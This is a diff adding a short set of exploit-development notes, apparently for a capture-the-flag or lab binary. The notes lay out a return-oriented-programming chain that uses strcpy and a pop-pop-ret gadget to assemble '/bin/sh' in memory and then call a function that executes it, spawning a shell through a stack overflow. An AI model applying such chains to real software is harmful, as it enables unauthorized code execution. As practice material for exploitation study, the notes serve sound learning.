@@ -1,0 +1,41 @@
+system at 0xf7e6b250
+root esp 0xffffcbcc
+
+plan: call 0x8053ab0 (execlp)
+
+stack at call:
+
+push 0
+push addr
+push addr
+
+stack pointer at vulnerable_function: 0xffffd160 0xffffd1fc 
+
+nearest hlt: 80492c8
+
+new plan: write 200 bytes of the stack to stdout
+
+push 200
+push suspected address
+
+0x80f112c exec string
+0x80c5ecc "/bin"
+0x80c5ec8 "/sh"
+0x804859d pop 2 words from stack and ret
+
+strcpy(0x80f112c, 0x80c5ecc) with return to pop2ret
+strcpy(0x80f112c + 4, 0x80c5ec8) with return to pop2ret
+call 0x08048ed0, exec_the_string
+
+stack (reversed order)
+
+- strcpy address
+- strcpy address
+- 0x804859d // pop2 return
+- 0x80f112c // dest
+- 0x80c5ecc // src1
+- strcpy address
+- 0x804859d // pop2 return
+- 0x80f112c + 4 // dest
+- 0x80c5ec8 // src2
+- 0x08048ed0 // exec_the_string
